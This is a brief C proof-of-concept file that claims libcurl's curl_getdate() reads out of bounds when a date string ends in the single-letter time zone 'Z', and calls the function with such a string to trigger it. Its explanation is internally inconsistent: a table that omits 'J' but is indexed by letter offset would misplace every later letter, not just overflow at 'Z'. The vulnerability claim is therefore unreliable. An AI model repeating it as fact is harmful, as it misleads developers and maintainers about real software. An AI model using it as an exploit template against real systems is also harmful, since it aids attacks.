/* PoC: curl_getdate() out-of-bounds read on a single-letter "Z" time zone.
 *
 * lib/parsedate.c's checktz() looks up single-letter time zone names (e.g.
 * "Z" for Zulu/UTC) by indexing directly into the global `tzone[]` table
 * with `tzone[first - 'A']`. The table only reserves 25 slots (A-Z minus
 * 'J', which is not a valid time zone letter), so 'Z' resolves to index 25,
 * one past the end of the table.
 */
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  time_t t = curl_getdate("06 Nov 1994 08:49:37 Z", NULL);
  printf("parsed = %ld\n", (long)t);
  return 0;
}
